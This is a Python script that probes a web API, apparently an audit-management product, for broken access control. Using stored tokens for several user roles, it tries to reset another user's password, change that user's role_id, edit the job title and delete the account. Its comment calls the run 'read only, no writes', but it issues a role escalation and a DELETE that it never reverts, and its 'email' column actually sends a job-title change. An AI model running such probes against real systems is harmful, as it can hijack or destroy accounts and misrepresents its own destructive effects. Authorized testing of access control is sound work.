import json,subprocess,os
H=os.environ['H']; BB=os.environ['BB']
def req(method,path,body=None,tok=None):
    cmd=['curl','-s','-m','40','-o','/tmp/b','-w','%{http_code}','-X',method,H+path,
         '-H','token: '+tok,'-H',BB,'-H','Content-Type: application/json',
         '-H','X-Auditboard-Product: System']
    if body is not None: cmd+=['-d',json.dumps(body)]
    return subprocess.run(cmd,capture_output=True,text=True).stdout.strip(), open('/tmp/b',encoding='utf-8',errors='replace').read()
TA=open('/tmp/tok_A').read().strip()
# pick a target nobody cares about: user 230 (B) - read only, no writes
TARGET=230
print("=== PUT /api/v1/users/230 : capability by attacker role ===")
print(f"{'attacker role':18} {'GET':>5} {'pw':>5} {'email':>6} {'job_title':>10} {'role_id':>8} {'DELETE':>7}")
for role,f in [('Owner(231)','/tmp/tok_A'),('Reviewer(171)','/tmp/tok_Reviewer'),
               ('Tester(170)','/tmp/tok_Tester'),('ExtAuditor(172)','/tmp/tok_ExternalAuditor')]:
    try: tok=open(f).read().strip()
    except: print(f"  {role:18} no token"); continue
    g,_=req('GET',f'/api/v1/users/{TARGET}',tok=tok)
    # use harmless probe values that we revert
    p,pb=req('PUT',f'/api/v1/users/{TARGET}',{"user":{"password":"Zx9!probe47"}},tok=tok)
    e,eb=req('PUT',f'/api/v1/users/{TARGET}',{"user":{"job_title":"ZX-PROBE"}},tok=tok)
    j,_=req('PUT',f'/api/v1/users/{TARGET}',{"user":{"job_title":"ZX-PROBE"}},tok=tok)
    r,_=req('PUT',f'/api/v1/users/{TARGET}',{"user":{"role_id":2}},tok=tok)
    d,_=req('DELETE',f'/api/v1/users/{TARGET}',tok=tok)
    print(f"{role:18} {g:>5} {p:>5} {e:>6} {j:>10} {r:>8} {d:>7}")
    if p=='200':
        # revert password immediately
        req('PUT',f'/api/v1/users/{TARGET}',{"user":{"password":"TesterZx2026!"}},tok=TA)
        req('PUT',f'/api/v1/users/{TARGET}',{"user":{"requires_password_change":False}},tok=TA)
        print("   (password reverted)")
